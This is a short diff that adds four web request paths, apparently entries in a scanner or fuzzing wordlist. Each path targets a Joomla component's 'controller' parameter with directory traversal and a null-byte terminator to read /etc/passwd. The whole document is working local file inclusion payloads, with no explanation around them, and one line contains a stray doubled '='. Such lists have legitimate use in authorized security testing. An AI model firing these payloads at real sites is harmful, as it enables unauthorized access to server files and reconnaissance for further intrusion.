@@ -1,0 +1,4 @@
+/index.php?option=com_vjdeo&controller=../../../../../../../../../../../../../../../etc/passwd%00
+/index.php?option=com_jprojectmanager&controller=../../../../../../../../../../etc/passwd%00
+/index.php?option=com_preventive&controller==../../../../../../../../../../etc/passwd%00
+/index.php?option=com_jfeedback&controller=../../../../../../../../../../etc/passwd%00
